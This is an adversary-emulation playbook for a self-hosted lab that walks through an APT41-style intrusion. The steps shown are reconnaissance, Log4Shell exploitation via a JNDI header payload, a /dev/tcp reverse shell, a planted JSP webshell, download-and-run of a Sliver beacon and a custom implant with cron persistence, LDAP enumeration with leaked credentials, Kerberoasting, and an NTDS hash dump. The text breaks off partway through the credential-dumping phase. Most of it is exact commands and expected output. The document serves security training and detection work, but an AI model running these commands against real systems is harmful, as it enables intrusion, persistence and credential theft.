# Attack Playbook — Operation DragonRx
## Phase-by-Phase Attack Guide: Exact Commands Against the Deployed Lab

**Operator perspective:** Most commands run from the Kali Docker container. A few use `docker` CLI
commands that must run on the **host machine** (not inside Kali — Docker is not installed in the container).
**Lab shell notation:**
- `[HOST]` — your host terminal (outside any container) — use for `docker logs`, `docker exec`, `make`
- `[KALI]` — Kali attacker container (`make shell` or `docker exec -it dragonrx_kali /bin/bash`)
- `[WEB01]` — shell on Ubuntu web server (192.168.10.100), obtained in Phase 1
- `[WS01]` — Windows 10 psexec session (192.168.10.50)
- `[DC01]` — Windows Server 2019 Domain Controller (192.168.10.10)
- `[C2]` — Sliver console (`docker exec -it dragonrx_c2 sliver`) — run from `[HOST]`

---

> **Operation DragonRx series** · [CTI Report](apt41-dragonrx-cti-report.md) · [Lab Architecture](lab-architecture.md) · **Attack Playbook** · [Detection Guide](detection-guide.md) · [DFIR Playbook](dfir-playbook.md) · [Malware Analysis](rxphage-malware.md)

## Table of Contents

- [Lab Start Checklist](#lab-start-checklist)
- [Network Reference Card](#network-reference-card)
- [Phase 0: Reconnaissance](#phase-0-reconnaissance)
- [Phase 1: Initial Access — Log4Shell](#phase-1-initial-access--log4shell-cve-2021-44228)
- [Phase 2: Foothold — Webshell + Implant](#phase-2-foothold--webshell--implant)
  - [2.3 Deploy Sliver Beacon (Operational C2)](#23-deploy-sliver-beacon-operational-c2)
  - [2.4 Deploy RxPhage Implant (Malware Analysis Artifact)](#24-deploy-rxphage-implant-malware-analysis-artifact)
- [Phase 3: Discovery](#phase-3-discovery)
- [Phase 4: Credential Access](#phase-4-credential-access)
- [Phase 5: Lateral Movement](#phase-5-lateral-movement)
- [Phase 6: Collection](#phase-6-collection)
- [Phase 7: Exfiltration](#phase-7-exfiltration)
- [Phase 8: DLL Sideloading Persistence on DC01](#phase-8-dll-sideloading-persistence-on-dc01)
- [Phase 9: Ransomware (Optional)](#phase-9-optional-ransomware-phase)
- [Phase 10: Cleanup](#phase-10-cleanup--anti-forensics)
- [Kill Chain Summary](#kill-chain-summary)

---

## Lab Start Checklist

Run these before touching any attack commands.

```bash
[HOST]
# 1. Deploy the lab (from dragonrx-lab/ directory)
# First run builds all Docker images including Kali automatically
make up
# First run: ~55 min (Kali build + Vagrant boxes download + Ansible provisioning)
# Subsequent runs (all cached): ~10 min

# 1b. Day-2+ sessions — lab already provisioned, just resuming
make resume
# Starts Docker containers + VMs + re-applies TCP offloading fix (see §TCP note below)

# 2. Verify all services are healthy
make test
# Expected: all green — DC01, FS01, WS01, Wazuh, Elastic, Zeek, JNDI

# 3. Open Kali attacker shell (keep this open throughout)
make shell
# Equivalent: docker exec -it dragonrx_kali /bin/bash

# 4. Optional: watch SIEM alerts in parallel
# Open http://localhost:5601 in a browser (Kibana)
# Navigate to: Security → Alerts
```

> **TCP offloading note:** Virtual NICs defer TCP checksum computation to hardware that does not
> exist in a virtual bridge stack. Linux receives packets with invalid checksums and silently drops
> them — TCP connections hang, ICMP ping still works (raw sockets bypass the offload path).
> `setup_routing.sh` (called by `make up` and `make resume`) disables TX checksum offloading on
> every interface in the data path: the Docker bridge, host-side veths, Kali's `eth1` (via `nsenter`),
> and web01's `eth1`. Ansible disables it on the Windows NIC2 (`Ethernet 2`) on all three VMs at
> provisioning time. **If Kali→Windows TCP ever breaks again, run `make resume` to re-apply.**

---

## Network Reference Card

```
ATTACKER NETWORK  10.0.0.0/24  (Docker bridge: attacker_net)
  10.0.0.5    dragonrx_kali   Your operator shell, staging HTTP server, reverse shell listener
  10.0.0.10   dragonrx_c2     Sliver C2 — HTTPS implant listener on :443 (internal)
  10.0.0.20   dragonrx_jndi   marshalsec LDAP relay :1389 + Exploit.class HTTP server :8080

TARGET NETWORK  192.168.10.0/24  (Docker bridge: target_net + VirtualBox bridged NICs)
  10.0.0.100 / 192.168.10.100  dragonrx_web01  Tomcat 9.0.54 + log4j-core 2.14.1  :8080
  192.168.10.10                DC01            Windows Server 2019 — novatech.local DC
  192.168.10.20                FS01            Windows Server 2019 — SMB file server
  192.168.10.50                WS01            Windows 10 22H2 — jsmith workstation
  192.168.10.200               dragonrx_wazuh  Wazuh manager
  192.168.10.203               dragonrx_kibana Kibana SIEM — http://localhost:5601

ROUTING: setup_routing.sh enables IP forwarding + iptables FORWARD between attacker_net and target_net.
Kali at 10.0.0.5 can reach all hosts in 192.168.10.0/24 via this routing.

WEB01 is dual-homed — reachable from Kali as 10.0.0.100:8080 AND from Windows VMs as 192.168.10.100:8080.
```

**Credentials provisioned by Ansible (do NOT use these directly — discover them in-sim):**
```
Domain:        novatech.local  /  NOVATECH (NetBIOS)
Administrator: NovaTech_Admin2024!    (Domain Admin on DC01)
jsmith:        Research#2024          (R&D dept — local admin on WS01)
svc_ldap:      NovaTech2021!          (service account — leaked in WEB01 config)
svc_backup:    Backup_Svc99!          (Kerberoastable — SPN set, Backup Operators member)
```

---

## Phase 0: Reconnaissance

**ATT&CK:** T1595.002, T1592.002, T1596.003, T1596.005, T1589.002

**What's happening:** Before touching the target, the attacker maps the external attack surface using
passive and active techniques that generate minimal or no alerts. The goal is to confirm the
Log4Shell-vulnerable Java application without triggering any SIEM rules.

### 0.1 Passive Recon (simulated — no real external footprint in lab)

> In the scenario, NovaTech Pharma has a patient portal at `portal.novatech-pharma.com`.
> Against a real target these would return real data. In the lab, skip to §0.2.

```bash
[KALI]
# Certificate transparency logs (crt.sh) — enumerate subdomains without touching target
# crt.sh is a public database of TLS certificates — read-only external query, zero alert on target
curl -s "https://crt.sh/?q=%25.novatech-pharma.com&output=json" | \
  python3 -c "
import sys, json
data = json.load(sys.stdin)
names = set(r['name_value'] for r in data)
[print(n) for n in sorted(names)]
" 2>/dev/null
# Expected: portal.novatech-pharma.com, api.novatech-pharma.com, mail.novatech-pharma.com ...

# Shodan — search internet-wide scan database for NovaTech assets
# Query runs against Shodan's index, never contacts the target
shodan search 'org:"NovaTech Pharma"' --fields ip_str,port,product,version 2>/dev/null
shodan search 'ssl.cert.subject.CN:"novatech-pharma.com"' 2>/dev/null

# Employee harvesting — LinkedIn/Google/Bing for email addresses and employee names
# Gives us potential usernames for password spray or phishing later
theHarvester -d novatech-pharma.com -b google,linkedin,bing -l 200 2>/dev/null
```

**Why it matters:** Passive recon confirms the target is running Java infrastructure and has internet-
exposed services. All of this creates zero alerts on the target — it never sees any of these requests.

### 0.2 Active Web Fingerprinting

```bash
[KALI]
# Create output directory
mkdir -p /opt/loot/recon

# Full version scan on the web application
# -sV: version detection   -sC: default scripts   -p 8080: port we care about
# -oA: write all output formats (nmap, gnmap, xml) to file
nmap -sV -sC -p 8080 10.0.0.100 -oA /opt/loot/recon/web01_scan
```

**Expected output:**
```
PORT     STATE SERVICE VERSION
8080/tcp open  http    Apache Tomcat 9.0.54
```

> The app suppresses the `Server:` response header. nmap confirms the port is open and HTTP — that is enough.

```bash
[KALI]
# Web technology fingerprinting
whatweb http://10.0.0.100:8080 -v 2>/dev/null | tee /opt/loot/recon/whatweb.txt
```

**Expected — JSON API, no HTML:**
```
Status    : 400 Bad Request
Content-Type: application/json
```

WhatWeb detects little: no HTML, no Server header, no cookies. The `application/json`
content type and bare 400 on `/` (missing `X-Api-Version` header) reveals a custom JSP API — not a
static site.

```bash
[KALI]
# Read raw response headers
curl -s -o /dev/null -D - http://10.0.0.100:8080/ | grep -iE "server|x-powered|content-type"
```

**Expected:**
```
Content-Type: application/json
```

```bash
[KALI]
# Probe for injection vectors: test the X-Api-Version header
# The JSP reads this header and passes it directly to log4j — the injection point
curl -v -H "X-Api-Version: recon-test" http://10.0.0.100:8080/ 2>&1 | grep -E "< HTTP|Content-Type"
```

**Expected:**
```
< HTTP/1.1 200 
< Content-Type: application/json;charset=UTF-8
```

A 200 confirms the app accepts and processes `X-Api-Version`. This is the header log4j logs.
The log4j version is not visible in the HTTP response — OOB callback in Phase 1.1 is the
confirmation step. CVE-2021-44228 affects all log4j-core 2.x prior to 2.15.0.

**SIEM detection posture:** Zero alerts. Standard HTTP requests with no exploit payload.
Zeek logs connections to conn.log; no rule match.

---

## Phase 1: Initial Access — Log4Shell (CVE-2021-44228)

**ATT&CK:** T1190

**What's happening:** Log4j 2 processes a JNDI lookup string (`${jndi:ldap://...}`) embedded in any
logged value — in this case the `X-Api-Version` HTTP header. When Log4j sees this string, it initiates
an outbound LDAP connection to the attacker-controlled relay (marshalsec). The relay redirects the
victim JVM to download a Java class from the attacker's HTTP server. The JVM runs Java 8 with `com.sun.jndi.ldap.object.trustURLCodebase=true` set as a JVM flag
(required since JDK 8u191+ disables remote class loading by default — the lab Dockerfile sets it
explicitly via `JAVA_OPTS`). It instantiates the downloaded class, executing its static initializer —
which runs our reverse shell command.

The `dragonrx_jndi` container handles the entire relay chain automatically:
- marshalsec LDAP relay: `10.0.0.20:1389`
- Exploit.class HTTP server: `10.0.0.20:8080` (host port `8888`)
- `Exploit.class` payload: `bash -i >& /dev/tcp/10.0.0.5/4444 0>&1`

**You do not compile anything.** Just open a listener and fire one curl.

### 1.1 Verify the JNDI Relay is Ready

```bash
[HOST]
# Check JNDI server container is running and listening
docker logs dragonrx_jndi 2>&1 | tail -8
```

**Expected:**
```
[*] Compiling Exploit.class (callback: 10.0.0.5:4444)...
[*] Exploit.class ready.
[*] Starting payload HTTP server on :8080...
[*] Starting marshalsec LDAP relay on :1389...
Listening on 0.0.0.0:1389
```

```bash
[KALI]
# Optional: verify WEB01 can reach the JNDI relay (dry run with no payload)
# This sends a JNDI lookup that will fail (no class named 'test') — but confirms callback
curl -s http://10.0.0.100:8080/ \
  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/test}'
```

```bash
[HOST]
# Check if JNDI server received the callback
docker logs dragonrx_jndi 2>&1 | tail -5
# Expected: "Received connection from 192.168.10.100" or similar
```

### 1.2 Get the Reverse Shell

```bash
[KALI] — Terminal 1: open reverse shell listener FIRST
# rlwrap adds readline support (arrow keys, history) to the raw nc shell
rlwrap nc -lvnp 4444
# Listening on 0.0.0.0 4444
```

```bash
[KALI] — Terminal 2: fire the exploit
# The ${jndi:ldap://} string is what Log4j processes
# 10.0.0.20:1389  — marshalsec LDAP relay
# /Exploit        — path that marshalsec redirects to http://10.0.0.20:8080/Exploit.class
curl -s http://10.0.0.100:8080/ \
  -H 'X-Api-Version: ${jndi:ldap://10.0.0.20:1389/Exploit}'
# No output expected — the curl just sends the header and returns
```

**Back in Terminal 1 — shell appears within 2-3 seconds:**
```
connect to [10.0.0.5] from (UNKNOWN) [10.0.0.100] XXXXX
bash: cannot set terminal process group: Inappropriate ioctl for device
bash: no job control in this shell
root@web01:/#
```

**Verify your position:**
```bash
[WEB01]
id
# uid=0(root) gid=0(root) groups=0(root)
whoami
# root
hostname
# web01
```

> The container runs as **root**. Ubuntu 22.04 — bash available, Python not installed.

**Forensic artifact created (irreversible):** Tomcat access log writes the raw `${jndi:}` string:
```
10.0.0.5 - - [20/Apr/2026:14:23:07 +0000] "GET / HTTP/1.1" 200 - "X-Api-Version: ${jndi:ldap://10.0.0.20:1389/Exploit}"
```
This log entry survives even if you delete bash history, kill the implant, or overwrite the shell.

**SIEM alerts fired:**
- Zeek HTTP: `Log4Shell JNDI string in X-Api-Version header` — **CRITICAL**
- Sysmon EID 1: `java spawned sh` — **CRITICAL**

**If the shell doesn't land:**
```bash
[HOST]
# Check the JNDI container caught the request
docker logs dragonrx_jndi 2>&1 | tail -10

# Confirm WEB01 JVM version and trustURLCodebase flag
docker exec dragonrx_web01 java -version 2>&1
# Expected: openjdk version "1.8.0_xxx" (any patch — lab sets trustURLCodebase=true via JAVA_OPTS)

# Confirm the JVM flag is set in the running Tomcat process
docker exec dragonrx_web01 ps aux | grep -o 'trustURLCodebase=[^ ]*'
# Expected: trustURLCodebase=true
```

```bash
[KALI]
# Check the Exploit.class is being served correctly
curl -s http://10.0.0.20:8080/Exploit.class | file -
# Should return: Java class data
```

---

## Phase 2: Foothold — Webshell + Implant

**ATT&CK:** T1505.003, T1053.003, T1059.004

**What's happening:** The reverse shell is fragile — a single network hiccup kills it with no way back.
APT41 is documented to establish multiple redundant persistence mechanisms before lateral movement.
We deploy two independent channels: a JSP webshell (instantly accessible via HTTP) and the RxPhage
beacon (persistent C2 via Sliver HTTPS). Both survive the reverse shell dying.

### 2.1 Stabilize the Reverse Shell

WEB01 is Ubuntu 22.04 — bash is available but Python is not installed. Use `script` to upgrade:

```bash
[WEB01 — raw reverse shell]
script -qc /bin/bash /dev/null
# Press Ctrl+Z
```

```bash
[KALI]
stty raw -echo
fg
# Press Enter once
```

```bash
[WEB01 — proper PTY]
export TERM=xterm
stty rows 50 cols 200
```

**Sliver C2 (§2.3) replaces the reverse shell** and provides full interactivity — the PTY upgrade
is optional if you plan to move to C2 immediately.

### 2.2 Deploy JSP Webshell (China Chopper Pattern)

**Why this path:** The lab uses Tomcat 9.0.54 with the log4shell WAR deployed to `webapps/ROOT/`.
Tomcat extracts the WAR at startup, giving a real writable webroot at `/opt/tomcat/webapps/ROOT/`.
Writing a JSP there makes it immediately accessible via the HTTP server.
The China Chopper one-liner pattern is extensively documented in APT41 intrusions.

```bash
[WEB01]
# Confirm the webroot exists and is writable
ls /opt/tomcat/webapps/ROOT/
# META-INF/  WEB-INF/  index.jsp

# Create a plausible-looking directory path
mkdir -p /opt/tomcat/webapps/ROOT/resources/imgs

# Write the webshell — one-liner, parameter-driven execution
cat > /opt/tomcat/webapps/ROOT/resources/imgs/cache.jsp << 'JSPEOF'
<%@page import="java.util.*,java.io.*"%><%
String cmd = request.getParameter("c");
if(cmd != null && !cmd.isEmpty()) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
    StringBuilder sb = new StringBuilder();
    String line;
    while((line = br.readLine()) != null) sb.append(line).append("\n");
    out.print(sb.toString());
}
%>
JSPEOF

ls -la /opt/tomcat/webapps/ROOT/resources/imgs/cache.jsp
```

**Test the webshell from Kali:**
```bash
[KALI]
curl -s "http://10.0.0.100:8080/resources/imgs/cache.jsp?c=id%3Bwhoami%3Bhostname"
```

**Expected:**
```
uid=0(root) gid=0(root) groups=0(root)
root
web01
```

**SIEM alert fired:**
- Wazuh: File created in Tomcat webroot — **HIGH**

### 2.3 Deploy Sliver Beacon (Operational C2)

**Why a Sliver beacon:** The reverse shell is fragile — one dropped packet kills it. The Sliver
beacon connects OUT to C2 on a schedule and reconnects automatically. This is the primary
persistent access channel for Phases 3–8.

> **RxPhage vs Sliver beacon:** These are two separate binaries with different roles.
> The Sliver beacon is your operational C2 shell. RxPhage (§2.4) is the PlugX-like custom
> implant that is the subject of the malware analysis article — it does NOT connect to Sliver.

**Step 1 — Generate the beacon (run once; binary persists in c2/loot volume):**

```bash
[C2] — from host, open Sliver console
docker exec -it dragonrx_c2 sliver

sliver > http --lhost 10.0.0.10 --lport 80
# [*] Successfully started job #N

sliver > generate beacon \
    --http 10.0.0.10:80 \
    --os linux --arch amd64 \
    --name dragonrx_beacon \
    --seconds 30 \
    --jitter 5 \
    --save /opt/loot/ \
    --skip-symbols
# [*] Build completed in Xs
# [*] Implant saved to /opt/loot/dragonrx_beacon
```

**Step 2 — Copy beacon to Kali's staging directory (run from host):**

```bash
[HOST]
docker cp dragonrx_c2:/opt/loot/dragonrx_beacon \
    ./attacker/tools/rxphage/dragonrx_beacon
```

**Step 3 — Start the staging HTTP server on Kali:**

```bash
[KALI] — Terminal 2
# Kill any stale server on 8900 first, then start fresh
fuser -k 8900/tcp 2>/dev/null || true
python3 -m http.server 8900 --directory /opt/tools/ &
# Serving HTTP on 0.0.0.0 port 8900 ...

# Confirm both binaries are available
ls /opt/tools/rxphage/
# dragonrx_beacon  rxphage  rxphage.exe
```

**Step 4 — Download and run on web01:**

```bash
[WEB01 — via reverse shell or webshell]
mkdir -p /tmp/.cache
wget -q http://10.0.0.5:8900/rxphage/dragonrx_beacon -O /tmp/.cache/dragonrx_beacon
chmod +x /tmp/.cache/dragonrx_beacon
nohup /tmp/.cache/dragonrx_beacon &>/dev/null &
echo "Beacon PID: $!"
```

**Step 5 — Verify beacon check-in (within ~35 seconds):**

```bash
[C2]
sliver > beacons
```

**Expected:**
```
ID        Name             Transport  Hostname  Username  OS/Arch      Last Check-In  Next Check-In
dc189fbc  dragonrx_beacon  http       web01     root      linux/amd64  5s ago         ~30s
```

> **Beacons ≠ Sessions:** `generate beacon` creates an async implant — it checks in on a schedule,
> gets queued tasks, executes them, and reports back. It does NOT appear under `sessions`.
> Use `beacons` to list them and `use <ID>` to task them.

**Interact with the beacon:**
```bash
sliver > use dragonrx_beacon

# Sliver built-in commands (no 'execute' needed):
sliver (dragonrx_beacon) > whoami        # current user
sliver (dragonrx_beacon) > getpid        # beacon PID
sliver (dragonrx_beacon) > ifconfig      # network interfaces
sliver (dragonrx_beacon) > ps            # process list
sliver (dragonrx_beacon) > cat /etc/hosts

# Arbitrary OS commands — use 'execute -o':
sliver (dragonrx_beacon) > execute -o -- id
sliver (dragonrx_beacon) > execute -o -- uname -a
sliver (dragonrx_beacon) > execute -o -- /bin/bash -c "ss -antup | grep -v 127.0.0.1"

# Note: beacon commands are async — output arrives on the next check-in (~30s)
```

**SIEM alert fired:**
- Zeek conn.log: Outbound HTTP beaconing to internal C2 (10.0.0.10:80) — **HIGH**

---

### 2.4 Deploy RxPhage Implant (Malware Analysis Artifact)

**What RxPhage is:** A custom Go implant mirroring APT41's PlugX behavioral patterns — XOR-encoded
config, jittered beacon loop, VM/debugger detection, cron persistence. It is the subject of
[rxphage-malware.md](rxphage-malware.md). In the lab it runs silently in the background;
the interesting part is static reverse engineering (Ghidra walkthrough in the article).

> RxPhage attempts to beacon to `updates.oracle-cdn.com` (XOR-encoded in the binary, key `0x4C`).
> That domain does not resolve in the lab — the beacon loop retries silently. This is intentional:
> the malware analysis shows how analysts recover the hidden C2 domain from the binary.

```bash
[KALI] — Terminal 2 (http.server already running from §2.3)
ls -lh /opt/tools/rxphage/rxphage
file /opt/tools/rxphage/rxphage
# ELF 64-bit LSB executable, x86-64, statically linked, stripped
```

```bash
[WEB01]
wget -q http://10.0.0.5:8900/rxphage/rxphage -O /tmp/.cache/rxphage
chmod +x /tmp/.cache/rxphage

file /tmp/.cache/rxphage
# ELF 64-bit LSB executable, x86-64, statically linked

# Cron persistence — @reboot survives container restarts
(crontab -l 2>/dev/null; echo '@reboot /tmp/.cache/rxphage') | crontab -
crontab -l
# @reboot /tmp/.cache/rxphage

nohup /tmp/.cache/rxphage &>/dev/null &
echo "RxPhage PID: $!"
```

**Verify both implants are running:**
```bash
[WEB01]
ps aux | grep -E 'dragonrx_beacon|rxphage' | grep -v grep
# root  1027  dragonrx_beacon
# root  1079  rxphage
```

**SIEM alerts fired:**
- Wazuh: Executable launched from /tmp — **HIGH**
- Zeek dns.log: Query for `updates.oracle-cdn.com` (NX) — **MEDIUM**

```bash
sliver > beacons
sliver > use dragonrx_beacon
sliver (dragonrx_beacon) > whoami
# root

sliver (dragonrx_beacon) > ifconfig
# eth0   10.0.0.100/24
# eth1   192.168.10.100/24
# lo     127.0.0.1/8

sliver (dragonrx_beacon) > getpid
# 1027
```

You now have persistent HTTP C2 to WEB01. Close the raw reverse shell — you don't need
it anymore. The Sliver session survives as long as the container runs, and restores after reboot via
cron.

---

## Phase 3: Discovery

**ATT&CK:** T1046, T1082, T1087.002, T1069.002, T1018, T1552.001

**What's happening:** Systematic internal recon. The attacker has code execution on a web server with
two network interfaces — a pivot point between the attacker network and the corporate target network.
The goal is to map the AD environment and find credentials to move laterally.

### 3.1 Host Information and Network Position

```bash
[WEB01 — via Sliver shell or webshell]
# Basic system information
id; whoami; hostname; uname -a; cat /etc/os-release | head -5

# Network interfaces — confirm dual-homed position
ip addr show
# eth0: 10.0.0.100/24       (attacker network — can reach Kali, C2, JNDI)
# eth1: 192.168.10.100/24   (target network — can reach DC01, FS01, WS01)

# Routing table — confirm routes to both networks
ip route show

# /etc/hosts — pre-configured hostnames?
cat /etc/hosts

# What's this process talking to already?
ss -antup | grep -v "127.0.0.1"
```

### 3.2 Internal Network Sweep

**Why:** We know the target /24 (192.168.10.0/24) from the routing table. We need to find all live
hosts and identify what services they expose before deciding where to move.

```bash
[WEB01]
# Ping sweep — runs all pings in parallel (& at end of each), waits for all to finish
for i in $(seq 1 254); do
  (ping -c 1 -W 1 192.168.10.$i &>/dev/null && echo "192.168.10.$i UP") &
done; wait
```

**Expected — live hosts found:**
```
192.168.10.5   UP   (dragonrx_kali — our own Kali container on target_net)
192.168.10.10  UP   (DC01)
192.168.10.20  UP   (FS01)
192.168.10.50  UP   (WS01)
192.168.10.100 UP   (WEB01 — ourselves)
192.168.10.200 UP   (Wazuh SIEM)
```

```bash
[KALI]
# Service scan against discovered Windows hosts — run from Kali (nmap pre-installed)
# -sV: detect service versions   -p: only scan relevant ports
nmap -sV -p 135,139,389,445,636,3389,5985,5986 \
  192.168.10.10 192.168.10.20 192.168.10.50 2>/dev/null
```

**Expected results:**
```
192.168.10.10 (DC01):
  389/tcp  open  ldap        Microsoft Windows Active Directory LDAP
  445/tcp  open  microsoft-ds Windows Server 2019
  3389/tcp open  ms-wbt-server RDP

192.168.10.20 (FS01):
  445/tcp  open  microsoft-ds Windows Server 2019

192.168.10.50 (WS01):
  445/tcp  open  microsoft-ds Windows 10
  3389/tcp open  ms-wbt-server RDP
  5985/tcp open  http         WinRM
```

**Assessment:**
- `192.168.10.10` — LDAP + RDP = Domain Controller
- `192.168.10.20` — SMB only = file server (the crown jewel location)
- `192.168.10.50` — SMB + RDP + WinRM = domain-joined workstation

**SIEM alert fired:**
- Zeek conn.log: port scan pattern from `192.168.10.100` — **MEDIUM**

### 3.3 Credential Discovery in WEB01 Config

**Why this works:** The `dragonrx_web01` container connects to Active Directory LDAP for user
authentication. Docker Compose passes those credentials via environment variables. In Linux, every
process's environment variables are readable at `/proc/PID/environ` — including by the process itself
(and by root — which we are).

```bash
[WEB01]
# Read this process's own environment — null-delimited, tr converts to newlines
cat /proc/1/environ | tr '\0' '\n' | sort
```

**Expected — credentials in plain text:**
```
DOMAIN_CONTROLLER=192.168.10.10
LDAP_PASS=NovaTech2021!
LDAP_USER=svc_ldap
HOSTNAME=web01
HOME=/root
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
...
```

```bash
[WEB01]
# Check Tomcat config for credentials
find / -name "context.xml" -o -name "tomcat-users.xml" 2>/dev/null | grep -v proc | \
  xargs grep -i "password\|username\|connectionPassword" 2>/dev/null

# Check web.xml for env-entry / resource-ref credentials
grep -i "password\|credential" /opt/tomcat/webapps/ROOT/WEB-INF/web.xml 2>/dev/null
```

**CRITICAL FIND:** `svc_ldap / NovaTech2021!` — valid Active Directory service account.
This single credential opens the entire AD directory for enumeration from this Linux container.

### 3.4 Active Directory Enumeration from Linux

**Why web01 as pivot:** web01 sits on `192.168.10.100` — the same segment as DC01. Kali is on
`attacker_net` and Windows Firewall on DC01 blocks LDAP from outside the domain. The compromised
server is the natural pivot: `ldapsearch` speaks LDAP natively from Linux, no Windows tools needed.

```bash
[WEB01]
# Install ldap-utils if not present (attackers do this routinely on a live target)
apt-get install -y ldap-utils 2>/dev/null | tail -1

# Enumerate all domain user accounts
# -x: simple auth   -H: LDAP URI   -D: bind DN (UPN format for AD)
# -b: search base   "(objectClass=user)": filter for user objects
ldapsearch -x \
  -H ldap://192.168.10.10 \
  -D "svc_ldap@novatech.local" \
  -w "NovaTech2021!" \
  -b "dc=novatech,dc=local" \
  "(objectClass=user)" \
  sAMAccountName description department userAccountControl \
  | grep -E "^sAMAccountName|^description|^department"
```

**Expected:**
```
sAMAccountName: Administrator
sAMAccountName: Guest
sAMAccountName: krbtgt
sAMAccountName: jsmith
description: R&D researcher
department: R&D
sAMAccountName: svc_ldap
description: LDAP service account — creds leaked in context.xml
sAMAccountName: svc_backup
description: Kerberoastable backup service account
```

```bash
[WEB01]
# Find Domain Admins group members
ldapsearch -x \
  -H ldap://192.168.10.10 \
  -D "svc_ldap@novatech.local" \
  -w "NovaTech2021!" \
  -b "cn=Domain Admins,cn=Users,dc=novatech,dc=local" \
  "(objectClass=group)" member \
  2>/dev/null
```

**Expected:** `member: CN=Administrator,CN=Users,DC=novatech,DC=local`

```bash
[WEB01]
# CRITICAL: find Kerberoastable accounts — users with SPNs registered
# SPN (Service Principal Name) presence means a valid TGS ticket can be requested
# and cracked offline — no DC interaction needed after the initial request
ldapsearch -x \
  -H ldap://192.168.10.10 \
  -D "svc_ldap@novatech.local" \
  -w "NovaTech2021!" \
  -b "dc=novatech,dc=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName memberOf \
  2>/dev/null | grep -E "^sAMAccountName|^servicePrincipalName|^memberOf"
```

**Expected:**
```
sAMAccountName: svc_backup
servicePrincipalName: MSSQLSvc/fs01.novatech.local:1433
memberOf: CN=Backup Operators,CN=Builtin,DC=novatech,DC=local
```

**Intelligence gained:**
- `svc_backup` has SPN → Kerberoastable (can request TGS, crack hash offline)
- `svc_backup` is in **Backup Operators** — a powerful Windows built-in group with SeBackupPrivilege
- `jsmith` is R&D → likely has access to the research data on FS01
- `jsmith` is confirmed local admin on WS01 (from Ansible provisioning)

---

## Phase 4: Credential Access

**ATT&CK:** T1552.001, T1558.003, T1003.001, T1003.003

### 4.1 Kerberoasting — svc_backup

**What is Kerberoasting:** When an account has a registered SPN, any authenticated domain user can
request a Kerberos TGS (Ticket Granting Service) ticket for it from the KDC. The KDC encrypts that
ticket with the target account's NTLM hash. The encrypted ticket is returned to the requestor — who
can then crack it offline with no further DC interaction. The cracking is entirely off-network.

```bash
[KALI]
mkdir -p /opt/loot

# Request TGS for every SPN-registered account using svc_ldap credentials
# -dc-ip: target Domain Controller
# -request: actually fetch the TGS tickets (not just list them)
# -outputfile: save hashes to file for hashcat
impacket-GetUserSPNs \
  novatech.local/svc_ldap:'NovaTech2021!' \
  -dc-ip 192.168.10.10 \
  -request \
  -outputfile /opt/loot/kerberoast_hashes.txt
```

**Expected:**
```
ServicePrincipalName                  Name        MemberShip           PasswordLastSet  LastLogon
------------------------------------  ----------  -------------------  ---------------  ---------
MSSQLSvc/fs01.novatech.local:1433     svc_backup  Backup Operators     2026-04-20       <never>

[-] CCache file is not found. Skipping...
$krb5tgs$23$*svc_backup$NOVATECH.LOCAL$novatech.local/svc_backup*$1a2b3c...
[hash written to /opt/loot/kerberoast_hashes.txt]
```

```bash
[KALI]
cat /opt/loot/kerberoast_hashes.txt
# $krb5tgs$23$*svc_backup$NOVATECH.LOCAL$MSSQLSvc/fs01.novatech.local:1433*$...
```

**Hash type note:** Modern impacket requests AES256 (etype 18) by default when the account supports
it — even if RC4 is also enabled. This lab produces `$krb5tgs$18$` (AES256). Older tools force
etype 23 (RC4) which cracks ~100× faster; on modern impacket there is no `-etype` flag, so the
DC chooses. Detection signal: Windows EID 4769.

```bash
[KALI]
# Ensure rockyou.txt is unzipped (Kali ships it gzipped)
gunzip /usr/share/wordlists/rockyou.txt.gz 2>/dev/null || true

# Option A: hashcat (requires GPU / OpenCL — NOT available in the Docker container)
# -m 19700: krb5tgs AES256 (etype 18)   -m 13100: RC4 (etype 23)
hashcat -m 19700 \
  /opt/loot/kerberoast_hashes.txt \
  /usr/share/wordlists/rockyou.txt \
  -o /opt/loot/kerberoast_cracked.txt \
  --force

# Option B: john (CPU — works in the Kali container without OpenCL)
# krb5-18 handles AES256 TGS tickets; krb5tgs handles RC4
john /opt/loot/kerberoast_hashes.txt \
  --wordlist=/usr/share/wordlists/rockyou.txt \
  --format=krb5-18

john /opt/loot/kerberoast_hashes.txt --show --format=krb5-18
```

**Expected:**
```
svc_backup:Backup_Svc99!:NOVATECH.LOCAL:MSSQLSvc/fs01.novatech.local:1433
```

**Result: `svc_backup / Backup_Svc99!`**

### 4.2 Backup Operators → NTDS Dump (Domain Compromise via svc_backup)

**What is Backup Operators privilege escalation:** Windows Backup Operators hold `SeBackupPrivilege` —
the right to bypass file ACLs for backup purposes. This includes reading any file on the system,
including `NTDS.dit` (the Active Directory database containing all password hashes). impacket's
`secretsdump -use-vss` leverages this by starting `RemoteRegistry` remotely and creating a VSS
shadow copy to read NTDS.dit.

> **Lab note:** `svc_backup` is also a member of the local `Administrators` group on DC01 —
> a common real-world misconfiguration where backup service accounts are granted excessive rights
> on the servers they protect. Without local admin, starting `RemoteRegistry` remotely is denied
> (RPC 0x5). The `SeBackupPrivilege` path to NTDS.dit works on a local shell even without
> local admin; the remote impacket path requires it.

ATT&CK: T1003.003 — OS Credential Dumping: NTDS

```bash
[KALI]
# Confirm svc_backup can authenticate to DC01 (domain auth, not local)
# -u: username   -p: password   --shares: list accessible SMB shares
crackmapexec smb 192.168.10.10 \
  -u svc_backup \
  -p 'Backup_Svc99!'
```

**Expected:**
```
SMB  192.168.10.10  445  DC01  [*] Windows Server 2019 Build 17763 (name:DC01) (domain:novatech.local) (signing:True) (SMBv1:False)
SMB  192.168.10.10  445  DC01  [+] novatech.local\svc_backup:Backup_Svc99!
```

```bash
[KALI]
# Primary: impacket-secretsdump via DRSUAPI (DCSync-equivalent — no VSS shadow copy needed)
# svc_backup is local Admin on DC01, which is enough to use DRSUAPI remotely
impacket-secretsdump novatech.local/svc_backup:'Backup_Svc99!'@192.168.10.10 \
  > /opt/loot/ntds_dump.txt 2>&1
cat /opt/loot/ntds_dump.txt | grep -E "^Administrator:|^krbtgt:|^.*jsmith|^.*svc_"
```

**Expected output:**
```
[*] Using the DRSUAPI method to get NTDS.DIT secrets
